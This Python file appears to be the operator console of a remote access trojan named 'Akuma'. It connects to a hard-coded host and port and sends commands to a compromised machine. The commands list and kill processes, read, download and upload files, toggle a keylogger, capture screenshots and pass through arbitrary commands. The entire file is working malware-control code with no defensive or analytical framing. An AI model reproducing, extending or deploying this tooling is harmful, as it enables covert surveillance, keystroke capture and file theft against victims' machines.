import socket
import os
import subprocess
import argparse
import sys
from modules_ import concatenate

class Akuma:
    def __init__(self,host='192.168.0.158',port=9876):
        self.HOST=host
        self.PORT=port
        self.cur_dir='C://'
        self.socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.CON_KEY=True
        self.dlc_key=False
        self.CMD_LIST={
            'pwd':self.path_to_dir,
            'terminate':self.terminate,
            'tasklist':self.tasks,
            'ls':self.list_files,
            'kill':self.kill_proc,
            'cd':self.change_dir,
            'cat':self.cat,
            'download':self.download,
            'clear':self.clear,
            'cls':self.cls,
            'upload':self.upload,
            'key_listen':self.key_listen,
            'take_ss':self.take_ss
        }
    def cmd_error(self,err):
        print(f'\n[!] Error | Command_Usage: {err}',end='\n\n')
    def print_(self,out,begin="",fin=""):
        print(begin)
        print(out,end='\n\n')
        print(fin)
    def recv_(self):
        br_bytes=b""
        while True:
            data=self.socket.recv(1024)
            br_bytes+=data
            if(br_bytes[-5:]==b"<END>"):
                return br_bytes[:-5]
    def take_ss(self):
        if(not os.path.exists('screenshots')):
            os.mkdir('screenshots')
        dir_list=os.listdir('screenshots')
        last=len(dir_list)+1
        self.socket.send(self.cmd.encode('utf-8'))
        out=self.recv_()
        if(not "[!]" in out[:30].decode('utf-8',errors='ignore')):
            img=open(f'screenshots/aku_ss{last}.png',"wb")
            img.write(out)
            img.close()
            self.print_(f'[SCREENSHOT RECIEVED] -> aku_ss{last}.png')
            """os.chdir('screenshots')
            
            with open(f'aku_ss{last}.png',"wb") as img:
                img.write(out)
                self.print_(f'[SCREENSHOT RECIEVED] -> aku_ss{last}.png')
            os.chdir('..')"""
        else:
            self.print_(out.decode('utf-8'))
    def key_listen(self):
        if('on' in self.cmd and not self.dlc_key):
            self.socket.send(self.cmd.encode('utf-8'))
            order=self.socket.recv(1024).decode('utf-8')
            if(order=="1"):
                self.print_("{STARTING THE KEYLOGGER}")
            self.dlc_key=True
        elif('on' in self.cmd and self.dlc_key):
            self.print_("[!] {KEYLOGGER IS ALREADY ON LISTENING_MODE}")
        elif('off' in self.cmd and self.dlc_key):
            self.socket.send(self.cmd.encode('utf-8'))
            self.print_("{CLOSING THE KEYLOGGER}")
            self.dlc_key=False
        elif('off' in self.cmd and not self.dlc_key):
            self.print_("[!] {KEYLOGGER IS OFF}")
    def upload(self):
        if('-n' in self.cmd and len(self.cmd_list)>=3):
            if(len(self.cmd_list)>4):self.cmd_list=concatenate.conc_path(self.cmd_list,self.cmd_list[2])
            file_name=self.cmd_list[2]
            if(not os.path.exists(self.cmd_list[3]) or not os.path.isfile(self.cmd_list[3])):
                print(f"\n[!] {self.cmd_list[3]} DOES NOT EXIST OR IT IS NOT A FILE\n")
                return False
            self.socket.send(" ".join([self.cmd_list[0],file_name]).encode('utf-8'))
            is_up=self.socket.recv(1024).decode('utf-8')
            if(is_up=="1"):
                with open(self.cmd_list[3],"rb") as file:
                    data=file.read()
                    self.socket.sendall(data)
                    self.socket.send(b"<END>")
                    out=self.socket.recv(1024).decode('utf-8')
                    print(out)
            else:
                print(is_up)
        else:
            self.cmd_error("upload -n <upload_name> <file_name>")
    def download(self):
        if(len(self.cmd_list)>2):self.cmd_list=concatenate.conc_path(self.cmd_list,self.cmd_list[0])
        if(not '/' in self.cmd_list[1]):
            file_name=self.cmd_list[1]
        else:
            file_name=self.cmd_list[1].split("/")[-1]
        self.socket.send(self.cmd.encode('utf-8'))
        out=self.recv_()
        if(not "[!]" in out[:30].decode('utf-8',errors='ignore')):
            with open(file_name,"wb") as file:
                file.write(out)
            self.print_(out=f"[{file_name} DOWNLOADED SUCCESSFULLY]")
        else:
            self.print_(out.decode('utf-8'))
    def cat(self):
        self.socket.send(self.cmd.encode('utf-8'))
        out=self.recv_().decode('utf-8')
        self.print_(out,begin='<CONTENT>',fin="<END>\n")
    def clear(self):os.system('clear')
    def cls(self):os.system('cls')
    def change_dir(self):
        self.socket.send(self.cmd.encode('utf-8'))
        out=self.socket.recv(1024).decode('utf-8')
        if('[!]' in out):
            self.print_(out)
        else:
            self.cur_dir=out
    def kill_proc(self):
        if(len(self.cmd_list)==3 and ("--im" in self.cmd_list or "--pid" in self.cmd_list)):
            self.socket.send(self.cmd.encode('utf-8'))
            out=self.socket.recv(1024).decode("utf-8")
            self.print_(out)
        else:
            self.cmd_error("\nkill --pid <process.id>\nkill --im <process.name>")
    def path_to_dir(self):
        if(len(self.cmd_list)==1):    
            self.socket.send(self.cmd.encode('utf-8'))
        out=self.socket.recv(1024).decode('utf-8')
        self.print_(out)
    def terminate(self):
        if(len(self.cmd_list)==1 or (len(self.cmd_list)==2 and self.cmd_list[1]=='-f')):
            self.socket.send(self.cmd.encode('utf-8'))
            self.socket.close()
            self.CON_KEY=False
        else:
            self.cmd_error('terminate <-f>')
    def tasks(self):
        if(len(self.cmd_list)==1):
            self.socket.send(self.cmd.encode('utf-8'))
            out=self.recv_().decode('utf-8',errors="replace")
            print(out)
        else:
            self.cmd_error('tasklist')
    def list_files(self):
        if(len(self.cmd_list)>2):
            self.cmd_list=concatenate.conc_path(self.cmd_list,self.cmd_list[0])
            print(self.cmd_list)
        self.socket.send(" ".join(self.cmd_list).encode('utf-8'))
        out=self.recv_().decode('utf-8',errors='replace')
        if not "[!]" in out:
            self.print_(out)
        else:
            self.print_(out)
    def default(self):
        self.socket.send(self.cmd.encode('utf-8'))
        out = self.recv_().decode('utf-8')
        self.print_(out)
    def execute(self,command):
        if(command in self.CMD_LIST):
            list(self.CMD_LIST.values())[list(self.CMD_LIST.keys()).index(command)]()
        else:
            self.default()
    def communication(self):
        self.socket.connect((self.HOST,self.PORT))
        self.socket.send('1'.encode('utf-8'))
        self.cur_dir=self.socket.recv(1024).decode('utf-8')
        while self.CON_KEY:
            self.cmd=input(f'[Execute({self.cur_dir}):] ')
            self.cmd_list=self.cmd.split()
            try:
                self.execute(self.cmd_list[0])
            except ConnectionResetError as err:
                print(f'[!] Error: {repr(err)}\n')
                sys.exit()

if __name__=='__main__':
    #parser=argparse.ArgumentParser(prog='Gnossienne')
    #parser.add_argument('-p','--port')
    #parser.add_argument('-t','--target')
    #args=parser.parse_args()
    #akuma=Akuma(port=int(args.port),host=args.target)
    akuma=Akuma()
    akuma.communication()